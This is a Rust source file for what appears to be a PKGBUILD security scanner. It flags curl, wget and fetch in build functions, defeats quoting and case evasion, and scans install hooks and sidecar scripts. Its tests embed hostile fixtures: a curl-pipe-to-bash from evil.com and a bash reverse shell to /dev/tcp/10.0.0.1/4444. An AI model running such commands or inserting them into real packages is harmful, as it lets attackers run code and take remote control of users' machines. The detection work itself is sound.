//! Pattern-based analyzer using the rule engine

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::rules::RuleEngine;
use crate::textutil::{logical_lines, normalize_shell_quoting};
use crate::types::{AnalysisContext, Category, FileType, Finding, Location, Severity};
use async_trait::async_trait;
use std::sync::Arc;

/// Analyzer that uses pattern matching from the rule engine
pub struct PatternAnalyzer {
    rule_engine: Arc<RuleEngine>,
}

impl PatternAnalyzer {
    /// Create a new pattern analyzer
    pub fn new(rule_engine: Arc<RuleEngine>) -> Self {
        Self { rule_engine }
    }
}

#[async_trait]
impl SecurityAnalyzer for PatternAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Analyze PKGBUILD content
        let pkgbuild_matches = self
            .rule_engine
            .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);

        for rule_match in pkgbuild_matches {
            if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                findings.push(Finding {
                    id: rule.id.clone(),
                    severity: rule.severity,
                    category: rule.category.clone(),
                    title: rule.name.clone(),
                    description: rule.description.clone(),
                    location: Location {
                        file: context.file_path.clone(),
                        line: Some(rule_match.line),
                        column: Some(rule_match.column),
                        snippet: Some(rule_match.context.clone()),
                    },
                    recommendation: rule.recommendation.clone(),
                    cwe_id: rule.cwe_id.clone(),
                    metadata: serde_json::json!({
                        "matched_text": rule_match.matched_text,
                    }),
                });
            }
        }

        // Analyze install scriptlets, ALPM side scripts (*.hook) and local source
        // sidecars (helper scripts shipped next to the PKGBUILD). Install
        // scriptlets and hooks run with elevated trust during a pacman
        // transaction; sidecars run inside build()/package(). A sidecar is
        // matched as `FileType::SourceFile`, a file type that every PKGBUILD rule
        // also applies to (see `RuleEngine::add_rule`).
        let primary = context.install_script.iter().map(|s| (s, false));
        let side = context.side_scripts.iter().map(|s| (s, true));
        for (script, is_side) in primary.chain(side) {
            let is_hook = script.path.extension().and_then(|e| e.to_str()) == Some("hook");
            let (kind, file_type) = if is_hook {
                ("alpm hook", FileType::InstallScript)
            } else if is_side {
                ("source sidecar", FileType::SourceFile)
            } else {
                ("install script", FileType::InstallScript)
            };
            let script_matches = self.rule_engine.match_content(&script.content, file_type);

            for rule_match in script_matches {
                if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                    findings.push(Finding {
                        id: rule.id.clone(),
                        severity: rule.severity,
                        category: rule.category.clone(),
                        title: format!("{} ({})", rule.name, kind),
                        description: rule.description.clone(),
                        location: Location {
                            file: script.path.clone(),
                            line: Some(rule_match.line),
                            column: Some(rule_match.column),
                            snippet: Some(rule_match.context.clone()),
                        },
                        recommendation: rule.recommendation.clone(),
                        cwe_id: rule.cwe_id.clone(),
                        metadata: serde_json::json!({
                            "matched_text": rule_match.matched_text,
                            "in_install_script": !matches!(file_type, FileType::SourceFile),
                            "script_kind": kind,
                        }),
                    });
                }
            }
        }

        // Analyze function bodies for specific patterns
        for (func_name, func_body) in &context.pkgbuild.functions {
            // Check for suspicious patterns in build/package functions
            if func_name == "build" || func_name == "package" || func_name.starts_with("package_") {
                let func_findings = self.analyze_function(context, func_name, func_body)?;
                findings.extend(func_findings);
            }
        }

        Ok(findings)
    }

    fn name(&self) -> &str {
        "pattern"
    }
}

impl PatternAnalyzer {
    /// Analyze a specific function for security issues
    fn analyze_function(
        &self,
        context: &AnalysisContext,
        func_name: &str,
        func_body: &crate::parser::FunctionBody,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Check for network access in build functions
        if func_name == "build" || func_name.starts_with("package") {
            let network_patterns = [
                ("curl", "Network access in build function"),
                ("wget", "Network access in build function"),
                ("fetch", "Network access in build function"),
            ];

            // Matched per logical line, so a comment silences only itself. The
            // old whole-body test skipped the function if `# curl` appeared
            // ANYWHERE in it, so one comment line hid a real `curl` on the next.
            // Each line is de-quoted the way the shell reads it (`"curl" url` is
            // `curl url`) and lower-cased so `CURL` cannot evade (audit HI-6).
            let lines: Vec<String> = logical_lines(&func_body.content)
                .into_iter()
                .filter(|(_, line)| !line.trim_start().starts_with('#'))
                .map(|(_, line)| normalize_shell_quoting(&line).to_lowercase())
                .collect();
            for (pattern, message) in &network_patterns {
                if lines.iter().any(|line| invokes_command(line, pattern)) {
                    findings.push(Finding {
                        id: "FUNC-001".to_string(),
                        severity: Severity::High,
                        category: Category::NetworkSecurity,
                        title: message.to_string(),
                        description: format!(
                            "Function '{}' contains network access command '{}'",
                            func_name, pattern
                        ),
                        location: Location {
                            file: context.file_path.clone(),
                            line: Some(func_body.line_start),
                            column: None,
                            snippet: None,
                        },
                        recommendation:
                            "Network access should happen in source= array, not build functions"
                                .to_string(),
                        cwe_id: None,
                        metadata: serde_json::json!({
                            "function": func_name,
                            "pattern": pattern,
                        }),
                    });
                }
            }
        }

        Ok(findings)
    }
}

/// Whether a de-quoted, lower-cased shell line runs `cmd` or expands a `$cmd` /
/// `${cmd}` variable.
///
/// The command name needs a word boundary on the left, so `libcurl`,
/// `prefetch` and `my_wget` are build-target names, not downloads (#35). A `/`
/// or `\` is a boundary, so `/usr/bin/curl` and `\curl` still count. It must be
/// followed by whitespace (space OR tab), as a command with arguments is.
fn invokes_command(line: &str, cmd: &str) -> bool {
    if line.contains(&format!("${cmd}")) || line.contains(&format!("${{{cmd}")) {
        return true;
    }
    line.match_indices(cmd).any(|(start, _)| {
        let bounded_left = line[..start]
            .chars()
            .next_back()
            .is_none_or(|c| !(c.is_alphanumeric() || matches!(c, '_' | '-' | '.')));
        let has_args = line[start + cmd.len()..]
            .chars()
            .next()
            .is_some_and(char::is_whitespace);
        bounded_left && has_args
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::{PkgbuildParser, StaticParser};
    use crate::types::ScanConfig;
    use std::path::PathBuf;

    fn create_test_context(pkgbuild_content: &str) -> AnalysisContext {
        let parser = StaticParser::new();
        let pkgbuild = parser.parse(pkgbuild_content).unwrap();

        AnalysisContext {
            pkgbuild,
            install_script: None,
            side_scripts: vec![],
            local_binaries: vec![],
            config: ScanConfig::default(),
            file_path: PathBuf::from("PKGBUILD"),
            registry: None,
        }
    }

    #[tokio::test]
    async fn test_detect_curl_bash() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(
            r#"
pkgname=test
pkgver=1.0
pkgrel=1
build() {
    curl https://evil.com/script.sh | bash
}
"#,
        );

        let findings = analyzer.analyze(&context).await.unwrap();
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.id == "DLE-001"));
    }

    #[tokio::test]
    async fn func001_case_variation_still_flags() {
        // Audit HI-6: FUNC-001 matches the build/package body case-insensitively,
        // so `CURL` in build() must still flag network access.
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);
        let context = create_test_context(
            "pkgname=test\npkgver=1.0\npkgrel=1\nbuild() {\n    CURL https://evil.com/x -o out\n}\n",
        );
        let findings = analyzer.analyze(&context).await.unwrap();
        assert!(
            findings.iter().any(|f| f.id == "FUNC-001"),
            "uppercase CURL in build() must still raise FUNC-001: {findings:?}"
        );
    }

    async fn func001_ids(build_body: &str) -> bool {
        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
        let context = create_test_context(&format!(
            "pkgname=test\npkgver=1\npkgrel=1\nbuild() {{\n{build_body}\n}}\n"
        ));
        let findings = analyzer.analyze(&context).await.unwrap();
        findings.iter().any(|f| f.id == "FUNC-001")
    }

    #[tokio::test]
    async fn func001_build_target_names_are_not_downloads() {
        // Reported in #35: building a target whose name ENDS in a command name
        // (`libcurl`, `prefetch`) is not network access.
        for target in [
            "libcurl", "libwget", "prefetch", "my_curl", "my-wget", "my.fetch",
        ] {
            assert!(
                !func001_ids(&format!(
                    "    cmake --build build --target {target} --parallel"
                ))
                .await,
                "building {target} is not network access"
            );
        }
    }

    #[tokio::test]
    async fn func001_download_commands_still_flag() {
        for line in [
            "curl https://example.com/src.tar.gz",
            "wget https://example.com/src.tar.gz",
            "fetch https://example.com/src.tar.gz",
            "/usr/bin/curl https://example.com/src.tar.gz",
            "./wget https://example.com/src.tar.gz",
            "\\curl https://example.com/src.tar.gz",
            "true;curl https://example.com/src.tar.gz",
            "make && wget https://example.com/src.tar.gz",
            "x=$(curl -s https://example.com/v)",
            "$curl https://example.com/src.tar.gz",
            "${wget} https://example.com/src.tar.gz",
            "cmake --build build --target libcurl; curl https://example.com/x",
        ] {
            assert!(
                func001_ids(&format!("    {line}")).await,
                "{line:?} must flag"
            );
        }
    }

    #[tokio::test]
    async fn func001_a_comment_only_silences_itself() {
        // The old check skipped the WHOLE function when `# curl` appeared
        // anywhere in it, so one comment line hid a real download.
        assert!(
            func001_ids("    # curl is only needed for the -git variant\n    curl https://evil.example/x -o y")
                .await,
            "a `# curl` comment must not hide a real curl on another line"
        );
        assert!(
            !func001_ids("    # curl https://example.com is mirrored in source=()").await,
            "a comment on its own is not network access"
        );
    }

    #[tokio::test]
    async fn func001_whitespace_and_quoting_cannot_hide_the_command() {
        for line in [
            "curl\thttps://example.com/x -o y",
            "\"curl\" https://example.com/x -o y",
            "'w'get https://example.com/x",
        ] {
            assert!(
                func001_ids(&format!("    {line}")).await,
                "{line:?} must flag"
            );
        }
    }

    #[tokio::test]
    async fn test_clean_pkgbuild() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(
            r#"
pkgname=test
pkgver=1.0
pkgrel=1
source=("https://example.com/test.tar.gz")
sha256sums=('abc123')
build() {
    make
}
package() {
    make DESTDIR="$pkgdir" install
}
"#,
        );

        let findings = analyzer.analyze(&context).await.unwrap();
        // Should have no critical findings
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[tokio::test]
    async fn sidecar_scripts_are_scanned_with_pkgbuild_rules() {
        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
        let mut context = create_test_context("pkgname=t\npkgver=1\npkgrel=1\n");
        context
            .side_scripts
            .push(crate::parser::ParsedInstallScript {
                content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n".to_string(),
                path: PathBuf::from("helper.sh"),
                hooks: vec![],
            });
        let findings = analyzer.analyze(&context).await.unwrap();
        let f = findings.iter().find(|f| f.id == "SHELL-001");
        assert!(f.is_some(), "sidecar reverse shell missed: {findings:?}");
        assert_eq!(f.unwrap().location.file, PathBuf::from("helper.sh"));
    }
}
